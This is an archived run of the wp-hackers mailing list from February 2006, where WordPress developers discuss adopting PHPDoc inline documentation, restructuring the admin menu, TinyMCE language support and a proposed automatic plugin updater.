In-Reply-To: <4742B752-53FB-441F-A538-F69D6B321804@txfx.net>
References: <3fgbv1hlotvrlvopnv1g50hnrf82kj1gm3@4ax.com>
	<5aa3aa0602171000s133e3918g68b6f8624210bd32@mail.gmail.com>
	<4742B752-53FB-441F-A538-F69D6B321804@txfx.net>
Message-ID: <63900d140602171033h7cbd39e2la9539ce9f550df5e@mail.gmail.com>

> As-is, I wouldn't put it in core either... but a core patch opens up
> more possibilities... things that Ozh couldn't have done with a
> strict plugin.  The idea has merit, it just needs the right execution.

Yeah...if somebody can make a nice menu like the one on
http://www.foxnews.com/ (a random site from google news), then the
plugin would be very useful.

Regards,
  - Dan Li
From dmhouse at gmail.com  Fri Feb 17 18:09:29 2006
From: dmhouse at gmail.com (David House)
Date: Fri Feb 17 18:36:09 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <80f75db0602170958v104151ebq4a41936bb8c04cf@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com> <43F5ECA3.3070800@midnightcircus.com>
	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
	<80f75db0602170958v104151ebq4a41936bb8c04cf@mail.gmail.com>
Message-ID: <ebe43d680602171009i3449ebel@mail.gmail.com>

On 17/02/06, Carthik Sharma <carthik@gmail.com> wrote:
> Digressing from the main topic here:
> David, some of the "Doesn't seem to do anything" params (like `all`
> and `optionall`) are actually supposed to do stuff , and they did,
> prior to a commit that broke that functionality. I suppose that is a
> bug, then.
> http://comox.textdrive.com/pipermail/wp-docs/2006-January/001232.html
> is where I wrote up about this recently.

Okay, but it's still important to document them accurately. Just lying
in the documentation to cover up a bug won't help anyone trying to use
the function then desperately trying to figure out why a given
parameter doesn't work...

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From rbowen at rcbowen.com  Fri Feb 17 18:39:13 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Fri Feb 17 18:41:10 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <512061b90602170717g615cd31fod27bafd1a68a6c59@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>	<5aa3aa0602161303ubbd4f03p9a6df881e783b16d@mail.gmail.com>	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>	<43F5D113.7010100@rcbowen.com>	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>	<43F5E655.1080608@rcbowen.com>
	<512061b90602170717g615cd31fod27bafd1a68a6c59@mail.gmail.com>
Message-ID: <43F61851.7070106@rcbowen.com>

Abhay Kumar wrote:
>> [snip]
>> I was hoping for some clarification on the term "ick", which doesn't
>> mean much. I suppose that sort of answers for this particular case.
>>
>> The syntax "@param" doesn't mean anything to me. Why "@" on that? Is
>> that supposed to signify something that I'm missing?
> 
> It's the phpdocumentor syntax that is used. check the wiki (codex)
> page and read a few of the posts that you missed on this thread.

That puts the emphasis on the HTML output rather than on the person
reading the code, and so really doesn't address the problem that I'm
trying to solve - that is, that when I'm reading the code, I don't know
what it means without reading the entire function.

However, if I thought for a moment that patches of that format would be
accepted, I would be glad to comply with that format.

-- 
Rich Bowen
rbowen@rcbowen.com
From rbowen at rcbowen.com  Fri Feb 17 18:41:01 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Fri Feb 17 18:42:58 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <ebe43d680602171009i3449ebel@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>	<43F5D113.7010100@rcbowen.com>	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>	<43F5E655.1080608@rcbowen.com>
	<43F5ECA3.3070800@midnightcircus.com>	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>	<80f75db0602170958v104151ebq4a41936bb8c04cf@mail.gmail.com>
	<ebe43d680602171009i3449ebel@mail.gmail.com>
Message-ID: <43F618BD.7090209@rcbowen.com>

David House wrote:
> On 17/02/06, Carthik Sharma <carthik@gmail.com> wrote:
>> Digressing from the main topic here:
>> David, some of the "Doesn't seem to do anything" params (like `all`
>> and `optionall`) are actually supposed to do stuff , and they did,
>> prior to a commit that broke that functionality. I suppose that is a
>> bug, then.
>> http://comox.textdrive.com/pipermail/wp-docs/2006-January/001232.html
>> is where I wrote up about this recently.
> 
> Okay, but it's still important to document them accurately. Just lying
> in the documentation to cover up a bug won't help anyone trying to use
> the function then desperately trying to figure out why a given
> parameter doesn't work...

This is somewhere that I would disagree. The documentation should
document the API, and the function should implement the API. If the
function is broken, this can be noted, but it is the job of the function
to implement the API, not of the API to document the function.

The XP perspective on this is that the documentation should be written
first, and then the code should be written that implements the
documentation. Obviously, it's a little late for that, but it's still
the right concept to keep in mind.

-- 
Rich Bowen
rbowen@rcbowen.com
From rbowen at rcbowen.com  Fri Feb 17 18:43:58 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Fri Feb 17 18:45:54 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
References: <43F33C8D.2010509@rcbowen.com>	<a491f91d0602161442n2970a61cg563701ee58c871f8@mail.gmail.com>	<e6ec604d0602161449q1693941fta728af2ee9ec318b@mail.gmail.com>	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>	<43F5D113.7010100@rcbowen.com>	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>	<43F5E655.1080608@rcbowen.com>
	<43F5ECA3.3070800@midnightcircus.com>
	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
Message-ID: <43F6196E.8050908@rcbowen.com>

David House wrote:
> On 17/02/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
>> Here's (IMO) a reasonable PHPDoc comment:
>>
>> /**
>>   * returns the system time in the format specified by $type
>>   * @param type string 'mysql' | 'timestamp'
>>   * @param gmt boolean
>>   * @return mixed
>>   */
> 
> As Matt has expressed his distaste for comments before really short
> functions, here's a more complicated example for list_cats()
> (attached).

This approach assumes that folks are *only* interested in the docs when
they are reading the code, and not focused on the HTML output. We seem
to be rather dual-personality on this. If we're wanting to produce a
useful, searchable, complete web-based document, then all functions must
be documented. If we're interested in having documentation in the code
that can be easily read by people looking at the source code, then we
can omit some functions, but there's no use using @param syntax, because
we don't care about the HTML output.

We should pick one approach and do it well, not do a semi-assed
implementation of both.

-- 
Rich Bowen
rbowen@rcbowen.com
From rbowen at rcbowen.com  Fri Feb 17 18:46:19 2006
From: rbowen at rcbowen.com (Rich Bowen)
Date: Fri Feb 17 18:48:09 2006
Subject: [wp-hackers] [PATCH] Documentation
In-Reply-To: <80f75db0602171003p1c070bddm9259677329ea6f02@mail.gmail.com>
References: <43F5010D.6070304@rcbowen.com>	<e6ec604d0602161455va4997b9q31f04e17374d6166@mail.gmail.com>	<43F5D34C.3080809@rcbowen.com>	<5aa3aa0602170954n1b0d911fl2d0069c33be44f2@mail.gmail.com>
	<80f75db0602171003p1c070bddm9259677329ea6f02@mail.gmail.com>
Message-ID: <43F619FB.90609@rcbowen.com>

Carthik Sharma wrote:
> On 2/17/06, Craig <nuclearmoose@gmail.com> wrote:
>> On 2/17/06, Rich Bowen <rbowen@rcbowen.com> wrote:
>>>
>>> I'm going for API documentation, not "use this to learn how to write
>>> PHP" documentation. It is assumed that folks will be willing to learn
>>> what the notation means. And once you've learned it, the docs become
>>> clear.
> 
> Rich, I suppose we both agree we are working towards something that is
> immediately useful to programmers. The benefit of using a system, such
> as phpdocumentor, for one, is that people can read the same comments,
> and browse the source at an automatically generated webpage. So it
> might be better to adapt to an existing system rather than create a
> new lingo (like it is better to use WP that to hand code a blog :) )

I think I've been won around to this syntax. I'm concerned, however,
with the notion that we'll only document long functions. This causes
them to be left out of the generated webpage entirely.

-- 
Rich Bowen
rbowen@rcbowen.com
From lists at abhaykumar.net  Fri Feb 17 18:55:21 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Fri Feb 17 18:57:23 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F6196E.8050908@rcbowen.com>
References: <43F33C8D.2010509@rcbowen.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com> <43F5ECA3.3070800@midnightcircus.com>
	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
	<43F6196E.8050908@rcbowen.com>
Message-ID: <512061b90602171055l5afb7c53s24d841d5b7f0b88a@mail.gmail.com>

> [snip]
> We should pick one approach and do it well, not do a semi-assed
> implementation of both.

Agreed., I really think we should be be documenting everything or just
stick to the current scheme haphazard commenting. There's no point in
starting on this unless we're ready to go all the way.

- Abhay

--
Abhay Kumar
http://abhaykumar.net/
From false.hopes at gmail.com  Fri Feb 17 19:04:02 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Feb 17 19:05:53 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <43F6196E.8050908@rcbowen.com>
References: <43F33C8D.2010509@rcbowen.com>
	<a491f91d0602161453k7a740c27m4907ff5aeffd4cbb@mail.gmail.com>
	<BAY109-DAV8B4463EE497743E89AEBC90FB0@phx.gbl>
	<a491f91d0602161511o4e2fd050t703ee79683055439@mail.gmail.com>
	<43F5D113.7010100@rcbowen.com>
	<512061b90602170547m3392a31cm21574b982b84febf@mail.gmail.com>
	<43F5E655.1080608@rcbowen.com> <43F5ECA3.3070800@midnightcircus.com>
	<ebe43d680602170818y5ae5f1f5i@mail.gmail.com>
	<43F6196E.8050908@rcbowen.com>
Message-ID: <a491f91d0602171104p7524a985y6173d7a0019ffd18@mail.gmail.com>

On 2/17/06, Rich Bowen <rbowen@rcbowen.com> wrote:
> David House wrote:
> > On 17/02/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> >> Here's (IMO) a reasonable PHPDoc comment:
> >>
> >> /**
> >>   * returns the system time in the format specified by $type
> >>   * @param type string 'mysql' | 'timestamp'
> >>   * @param gmt boolean
> >>   * @return mixed
> >>   */
> >
> > As Matt has expressed his distaste for comments before really short
> > functions, here's a more complicated example for list_cats()
> > (attached).
>
> This approach assumes that folks are *only* interested in the docs when
> they are reading the code, and not focused on the HTML output. We seem
> to be rather dual-personality on this. If we're wanting to produce a
> useful, searchable, complete web-based document, then all functions must
> be documented. If we're interested in having documentation in the code
> that can be easily read by people looking at the source code, then we
> can omit some functions, but there's no use using @param syntax, because
> we don't care about the HTML output.
>
> We should pick one approach and do it well, not do a semi-assed
> implementation of both.

I personally believe that we should stick with PHPDoc syntax with
@param and @return.

In case it wasn't clarified with the responses, here's a quick psuedo
comment that describes what they do, and how easy it is to represent
code with PHPDoc. Each @param represents one of the parameters or
arguments to the function, in order.

/**
  * Description goes here
  * @param int $number or other description
  * @param  string $some text for a link
  * @return string the final output
  **/

Its easy to understand for humans and parsers alike, and is especially
useful to the number of us who use Zend Studio for code development,
as they have beautiful tooltips automatically generated from these
comments that explains everything nicely.

--
--Robert Deaton
http://somethingunpredictable.com
From steagl at people.it  Fri Feb 17 19:27:20 2006
From: steagl at people.it (Stefano)
Date: Fri Feb 17 19:29:20 2006
Subject: [wp-hackers] Poposal to improve Admin menu
References: <3fgbv1hlotvrlvopnv1g50hnrf82kj1gm3@4ax.com>
	<5aa3aa0602171000s133e3918g68b6f8624210bd32@mail.gmail.com>
	<4742B752-53FB-441F-A538-F69D6B321804@txfx.net>
Message-ID: <mc8cv1t3412hs6uhg3qtjk70dg27kr3gta@4ax.com>

Il Fri, 17 Feb 2006 13:09:50 -0500, Mark Jaquith
<mark.wordpress@txfx.net> scrive:

>On Feb 17, 2006, at 1:00 PM, Craig wrote:
>
>> This plugin is best left as a plugin, IMO, and not be part of the  
>> core. If
>> it was part of the core, I would disable it.
>
>As-is, I wouldn't put it in core either... but a core patch opens up  
>more possibilities... things that Ozh couldn't have done with a  
>strict plugin.  The idea has merit, it just needs the right execution.

That's was the idea of my post, the "including" proposal was more
referred to the idea itself than how the plugin actually works.
Getting rid of the 2 click to go to a panel page having a direct
access mayb with a dropdown mmenu or other nice tricks will open the
way to have a 3rd level menu.

Actually plugin can put menus in everyplace they want, i would prefere
to have them acting as the themes that since the new default add
settings menu directly under the theme root menu. if they stay on
Plugins root menu and there is chanche for a 3rd level menu, comlex
plugin can show a structure like:

Plugins-|
        |
        - Plugin1--|
	|	   - Setup
	|	   - Config
       	|	   - Remove
	|
	- Plugin2--|
		   - Basic Option
		   - Advanced Option

This will avoid having varius menu around, messng up the standard menu
and avoiding a to much cluttered second level menu for people having
dozens of plugin active

-- 

Stefano Aglietti - StallonIt on IRCnet - ICQ#: 2078431
Email: steve@40annibuttati.it steagl@people.it
Sites: http://www.40annibuttati.it (personal blog)
       http://www.wordpress-it.it (WordPress Italia)
From false.hopes at gmail.com  Fri Feb 17 21:41:51 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Feb 17 21:43:43 2006
Subject: [wp-hackers] [PATCH] Documentation
In-Reply-To: <43F619FB.90609@rcbowen.com>
References: <43F5010D.6070304@rcbowen.com>
	<e6ec604d0602161455va4997b9q31f04e17374d6166@mail.gmail.com>
	<43F5D34C.3080809@rcbowen.com>
	<5aa3aa0602170954n1b0d911fl2d0069c33be44f2@mail.gmail.com>
	<80f75db0602171003p1c070bddm9259677329ea6f02@mail.gmail.com>
	<43F619FB.90609@rcbowen.com>
Message-ID: <a491f91d0602171341y61b45966saa7e6310bd9e0a44@mail.gmail.com>

On 2/17/06, Rich Bowen <rbowen@rcbowen.com> wrote:
> Carthik Sharma wrote:
> > On 2/17/06, Craig <nuclearmoose@gmail.com> wrote:
> >> On 2/17/06, Rich Bowen <rbowen@rcbowen.com> wrote:
> >>>
> >>> I'm going for API documentation, not "use this to learn how to write
> >>> PHP" documentation. It is assumed that folks will be willing to learn
> >>> what the notation means. And once you've learned it, the docs become
> >>> clear.
> >
> > Rich, I suppose we both agree we are working towards something that is
> > immediately useful to programmers. The benefit of using a system, such
> > as phpdocumentor, for one, is that people can read the same comments,
> > and browse the source at an automatically generated webpage. So it
> > might be better to adapt to an existing system rather than create a
> > new lingo (like it is better to use WP that to hand code a blog :) )
>
> I think I've been won around to this syntax. I'm concerned, however,
> with the notion that we'll only document long functions. This causes
> them to be left out of the generated webpage entirely.

Like I said in the other thread, I will personally be documenting them
anyways and submitting the patches, no matter how trivial the
functions may be. Perhaps such will be a wakeup call in the sense that
this function pollution crap could use some fixing as well.

--
--Robert Deaton
http://somethingunpredictable.com
From false.hopes at gmail.com  Fri Feb 17 22:31:16 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Feb 17 22:33:11 2006
Subject: [wp-hackers] Inline Documentation Progress
Message-ID: <a491f91d0602171431p751cdd2en5f46e4867ce26ee1@mail.gmail.com>

wp-includes/wpdb.php - Complete (by me)
http://trac.wordpress.org/ticket/2474

wp-includes/functions-post.php - Started (by skippy)
http://trac.wordpress.org/ticket/2473
From lists at abhaykumar.net  Fri Feb 17 22:53:00 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Fri Feb 17 22:54:53 2006
Subject: [wp-hackers] Inline Documentation Progress
In-Reply-To: <a491f91d0602171431p751cdd2en5f46e4867ce26ee1@mail.gmail.com>
References: <a491f91d0602171431p751cdd2en5f46e4867ce26ee1@mail.gmail.com>
Message-ID: <512061b90602171453j363c4f12ia6b83680dc48addc@mail.gmail.com>

Why don't we keep a list here:

http://codex.wordpress.org/Inline_Documentation

-Abhay

On 2/17/06, Robert Deaton <false.hopes@gmail.com> wrote:
> wp-includes/wpdb.php - Complete (by me)
> http://trac.wordpress.org/ticket/2474
>
> wp-includes/functions-post.php - Started (by skippy)
> http://trac.wordpress.org/ticket/2473
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>


--
Abhay Kumar
http://abhaykumar.net/
From nuclearmoose at gmail.com  Fri Feb 17 22:56:31 2006
From: nuclearmoose at gmail.com (Craig)
Date: Fri Feb 17 22:58:24 2006
Subject: [wp-hackers] Inline Documentation Progress
In-Reply-To: <512061b90602171453j363c4f12ia6b83680dc48addc@mail.gmail.com>
References: <a491f91d0602171431p751cdd2en5f46e4867ce26ee1@mail.gmail.com>
	<512061b90602171453j363c4f12ia6b83680dc48addc@mail.gmail.com>
Message-ID: <5aa3aa0602171456l5f14da5hfda39378c29ea99a@mail.gmail.com>

On 2/17/06, Abhay Kumar <lists@abhaykumar.net> wrote:
>
> Why don't we keep a list here:
>
> http://codex.wordpress.org/Inline_Documentation


Already added!
Craig.
From blogger at steffensenfamily.com  Fri Feb 17 23:13:03 2006
From: blogger at steffensenfamily.com (Kirk Steffensen)
Date: Fri Feb 17 23:14:59 2006
Subject: [wp-hackers] Language support for TinyMCE
In-Reply-To: <a9gbv1952d2us5qjd00uqaemmn0qf5ub13@4ax.com>
References: <20060216132742.h19k6wvs0k0cssso@cs18.simplehost.com>
	<a9gbv1952d2us5qjd00uqaemmn0qf5ub13@4ax.com>
Message-ID: <20060217181303.30mz10n9c480ggwg@cs18.simplehost.com>

Thanks.  It's posted on Trac as ticket #2476.
http://trac.wordpress.org/ticket/2476

Quoting Stefano <steagl@people.it>:
> +1 for me.
>
> I think you could submit the patch to trac so bug gardeners will check
> it and then Ryan will do too.


From false.hopes at gmail.com  Fri Feb 17 23:14:28 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Feb 17 23:16:19 2006
Subject: [wp-hackers] Inline Documentation Progress
In-Reply-To: <5aa3aa0602171456l5f14da5hfda39378c29ea99a@mail.gmail.com>
References: <a491f91d0602171431p751cdd2en5f46e4867ce26ee1@mail.gmail.com>
	<512061b90602171453j363c4f12ia6b83680dc48addc@mail.gmail.com>
	<5aa3aa0602171456l5f14da5hfda39378c29ea99a@mail.gmail.com>
Message-ID: <a491f91d0602171514k7c2f5949u908be7f57e37ed2a@mail.gmail.com>

I'm going to go ahead and run through and add the trac tag
"inline-docs" to the ones up as well, so we can keep them organized in
trac.

(I also just did another file, its listed on the codex as well)
--
--Robert Deaton
http://somethingunpredictable.com
From grijalva at gmail.com  Fri Feb 17 23:22:00 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Fri Feb 17 23:23:50 2006
Subject: [wp-hackers] Automatic Plugin Updater
Message-ID: <a0159cd30602171522i6f409932re4bc2a2338b728a5@mail.gmail.com>

I'm working on a plugin to make it easy to upgrade installed plugins to
their latest versions.  It will operate similarly to the FireFox extension
update system.  I'm wondering if maybe this should be part of the core
instead of a plugin.  Any thoughts?

-dave
From skeltoac at gmail.com  Fri Feb 17 23:38:14 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Fri Feb 17 23:40:05 2006
Subject: [wp-hackers] Automatic Plugin Updater
In-Reply-To: <a0159cd30602171522i6f409932re4bc2a2338b728a5@mail.gmail.com>
References: <a0159cd30602171522i6f409932re4bc2a2338b728a5@mail.gmail.com>
Message-ID: <e6ec604d0602171538qcaa881bs790567e53973d38f@mail.gmail.com>

On 2/17/06, Dave Grijalva <grijalva@gmail.com> wrote:
> I'm working on a plugin to make it easy to upgrade installed plugins to
> their latest versions.  It will operate similarly to the FireFox extension
> update system.  I'm wondering if maybe this should be part of the core
> instead of a plugin.  Any thoughts?

We've learned from the uploading and caching functions just how tricky
it can be to make directories and write files on some setups. Remember
that most people don't leave their plugins directory writable by the
server. Hunt down the people who had the worst troubles (see trac and
the wp-hackers and wp-testers archives) and ask them to test for you.

In the interest of making your work viable as a core feature, take
very good care with security and making it work on as many platforms
as possible.

Andy
From lists at abhaykumar.net  Fri Feb 17 23:50:10 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Fri Feb 17 23:52:04 2006
Subject: [wp-hackers] Inline Documentation Progress
In-Reply-To: <a491f91d0602171514k7c2f5949u908be7f57e37ed2a@mail.gmail.com>
References: <a491f91d0602171431p751cdd2en5f46e4867ce26ee1@mail.gmail.com>
	<512061b90602171453j363c4f12ia6b83680dc48addc@mail.gmail.com>
	<5aa3aa0602171456l5f14da5hfda39378c29ea99a@mail.gmail.com>
	<a491f91d0602171514k7c2f5949u908be7f57e37ed2a@mail.gmail.com>
Message-ID: <512061b90602171550y2cf6387btc797ae085d9efc0a@mail.gmail.com>

I've added a list of files. maybe it'll be useful.

- Abhay

On 2/17/06, Robert Deaton <false.hopes@gmail.com> wrote:
> I'm going to go ahead and run through and add the trac tag
> "inline-docs" to the ones up as well, so we can keep them organized in
> trac.
>
> (I also just did another file, its listed on the codex as well)
> --
> --Robert Deaton
> http://somethingunpredictable.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>


--
Abhay Kumar
http://abhaykumar.net/
From grijalva at gmail.com  Fri Feb 17 23:57:24 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Fri Feb 17 23:59:15 2006
Subject: [wp-hackers] Automatic Plugin Updater
In-Reply-To: <e6ec604d0602171538qcaa881bs790567e53973d38f@mail.gmail.com>
References: <a0159cd30602171522i6f409932re4bc2a2338b728a5@mail.gmail.com>
	<e6ec604d0602171538qcaa881bs790567e53973d38f@mail.gmail.com>
Message-ID: <a0159cd30602171557w78e057f6v9356db37cfd688f@mail.gmail.com>

Yeah.  I think I'll write it as a plugin and look into core integration once
its stable and tested.  For users without write permissions on the plugins
folder, I can at least allow them to see when there's updates and perhaps
even download them right from there.

-dave

On 2/17/06, Andy Skelton <skeltoac@gmail.com> wrote:
>
> On 2/17/06, Dave Grijalva <grijalva@gmail.com> wrote:
> > I'm working on a plugin to make it easy to upgrade installed plugins to
> > their latest versions.  It will operate similarly to the FireFox
> extension
> > update system.  I'm wondering if maybe this should be part of the core
> > instead of a plugin.  Any thoughts?
>
> We've learned from the uploading and caching functions just how tricky
> it can be to make directories and write files on some setups. Remember
> that most people don't leave their plugins directory writable by the
> server. Hunt down the people who had the worst troubles (see trac and
> the wp-hackers and wp-testers archives) and ask them to test for you.
>
> In the interest of making your work viable as a core feature, take
> very good care with security and making it work on as many platforms
> as possible.
>
> Andy
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From ryan at ryanduff.net  Fri Feb 17 23:58:13 2006
From: ryan at ryanduff.net (Ryan Duff)
Date: Fri Feb 17 23:59:48 2006
Subject: [wp-hackers] Automatic Plugin Updater
In-Reply-To: <e6ec604d0602171538qcaa881bs790567e53973d38f@mail.gmail.com>
References: <a0159cd30602171522i6f409932re4bc2a2338b728a5@mail.gmail.com>
	<e6ec604d0602171538qcaa881bs790567e53973d38f@mail.gmail.com>
Message-ID: <43F66315.1050009@ryanduff.net>

Andy Skelton wrote:
> On 2/17/06, Dave Grijalva <grijalva@gmail.com> wrote:
>> I'm working on a plugin to make it easy to upgrade installed plugins to
>> their latest versions.  It will operate similarly to the FireFox extension
>> update system.  I'm wondering if maybe this should be part of the core
>> instead of a plugin.  Any thoughts?
> 
> We've learned from the uploading and caching functions just how tricky
> it can be to make directories and write files on some setups. Remember
> that most people don't leave their plugins directory writable by the
> server. Hunt down the people who had the worst troubles (see trac and
> the wp-hackers and wp-testers archives) and ask them to test for you.
> 
> In the interest of making your work viable as a core feature, take
> very good care with security and making it work on as many platforms
> as possible.
> 
> Andy

As a short time user of Dr Dave's plugin manager, I learned how quickly 
things can get messed up. Permissions, plugins not working because of 
bad permissions, not being able to delete plugins, etc.. I still think 
this is a difficult proposition. It would be nice to see it working, but 
installing things automatically on a web server and keeping them working 
is very different than installing them in a PC environment.

-- 
Ryan Duff
http://ryanduff.net
AIM: ryancduff
irc.freenode.net #wordpress
From grijalva at gmail.com  Sat Feb 18 00:08:27 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Sat Feb 18 00:10:20 2006
Subject: [wp-hackers] Automatic Plugin Updater
In-Reply-To: <43F66315.1050009@ryanduff.net>
References: <a0159cd30602171522i6f409932re4bc2a2338b728a5@mail.gmail.com>
	<e6ec604d0602171538qcaa881bs790567e53973d38f@mail.gmail.com>
	<43F66315.1050009@ryanduff.net>
Message-ID: <a0159cd30602171608r40773f9p499f97cf0590ad28@mail.gmail.com>

Difficult, yes.  Worthwhile if i can make it work, also yes.  At the very
least, being able to quickly see which plugins have updates available and
download them all from within the admin would be very helpful.

On 2/17/06, Ryan Duff <ryan@ryanduff.net> wrote:
>
> Andy Skelton wrote:
> > On 2/17/06, Dave Grijalva <grijalva@gmail.com> wrote:
> >> I'm working on a plugin to make it easy to upgrade installed plugins to
> >> their latest versions.  It will operate similarly to the FireFox
> extension
> >> update system.  I'm wondering if maybe this should be part of the core
> >> instead of a plugin.  Any thoughts?
> >
> > We've learned from the uploading and caching functions just how tricky
> > it can be to make directories and write files on some setups. Remember
> > that most people don't leave their plugins directory writable by the
> > server. Hunt down the people who had the worst troubles (see trac and
> > the wp-hackers and wp-testers archives) and ask them to test for you.
> >
> > In the interest of making your work viable as a core feature, take
> > very good care with security and making it work on as many platforms
> > as possible.
> >
> > Andy
>
> As a short time user of Dr Dave's plugin manager, I learned how quickly
> things can get messed up. Permissions, plugins not working because of
> bad permissions, not being able to delete plugins, etc.. I still think
> this is a difficult proposition. It would be nice to see it working, but
> installing things automatically on a web server and keeping them working
> is very different than installing them in a PC environment.
>
> --
> Ryan Duff
> http://ryanduff.net
> AIM: ryancduff
> irc.freenode.net #wordpress
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From ringmaster at midnightcircus.com  Sat Feb 18 00:25:47 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Sat Feb 18 00:28:00 2006
Subject: [wp-hackers] Automatic Plugin Updater
In-Reply-To: <a0159cd30602171608r40773f9p499f97cf0590ad28@mail.gmail.com>
References: <a0159cd30602171522i6f409932re4bc2a2338b728a5@mail.gmail.com>
	<e6ec604d0602171538qcaa881bs790567e53973d38f@mail.gmail.com>
	<43F66315.1050009@ryanduff.net>
	<a0159cd30602171608r40773f9p499f97cf0590ad28@mail.gmail.com>
Message-ID: <43F6698B.5080709@midnightcircus.com>

Dave Grijalva wrote:
> Difficult, yes.  Worthwhile if i can make it work, also yes.  At the very
> least, being able to quickly see which plugins have updates available and
> download them all from within the admin would be very helpful.

Mostly already done here:
http://mattread.com/projects/wp-plugins/installer-the-plugin/

Matt also has a more recent version that supports some of the XML-RPC 
stuff that we were talking about.  I'm not sure where he is in terms of 
release for that version yet, though.

Owen

From kimmo+key+wordpress.c4f53f at suominen.com  Sat Feb 18 05:44:42 2006
From: kimmo+key+wordpress.c4f53f at suominen.com (Kimmo Suominen)
Date: Sat Feb 18 05:46:37 2006
Subject: [wp-hackers] Language support for TinyMCE
In-Reply-To: <20060217181303.30mz10n9c480ggwg@cs18.simplehost.com>
References: <20060216132742.h19k6wvs0k0cssso@cs18.simplehost.com>
	<a9gbv1952d2us5qjd00uqaemmn0qf5ub13@4ax.com>
	<20060217181303.30mz10n9c480ggwg@cs18.simplehost.com>
Message-ID: <20060218054442.GH8319@kimmo.suominen.com>

On Fri, Feb 17, 2006 at 06:13:03PM -0500, Kirk Steffensen wrote:
> Thanks.  It's posted on Trac as ticket #2476.
> http://trac.wordpress.org/ticket/2476

Thank you, Kirk!

Cheers,
+ Kimmo
-- 
<A HREF="http://kimmo.suominen.com/">Kimmo Suominen</A>

From aaron at technosailor.com  Sat Feb 18 06:10:50 2006
From: aaron at technosailor.com (Aaron Brazell)
Date: Sat Feb 18 06:12:41 2006
Subject: [wp-hackers] theme-based functions.php should override
	pluggable-functions.php
Message-ID: <ca7320070602172210g6b36f3fbre11d54df9dfc493e@mail.gmail.com>

Don't you think?

Ticket #2479 <http://trac.wordpress.org/ticket/2479#preview> in Trac.
From skeltoac at gmail.com  Sat Feb 18 08:50:02 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Sat Feb 18 08:51:55 2006
Subject: [wp-hackers] theme-based functions.php should override
	pluggable-functions.php
In-Reply-To: <ca7320070602172210g6b36f3fbre11d54df9dfc493e@mail.gmail.com>
References: <ca7320070602172210g6b36f3fbre11d54df9dfc493e@mail.gmail.com>
Message-ID: <e6ec604d0602180050k26e8cff6yf19bec2652c50506@mail.gmail.com>

On 2/18/06, Aaron Brazell <aaron@technosailor.com> wrote:
> Don't you think?
>
> Ticket #2479 <http://trac.wordpress.org/ticket/2479#preview> in Trac.

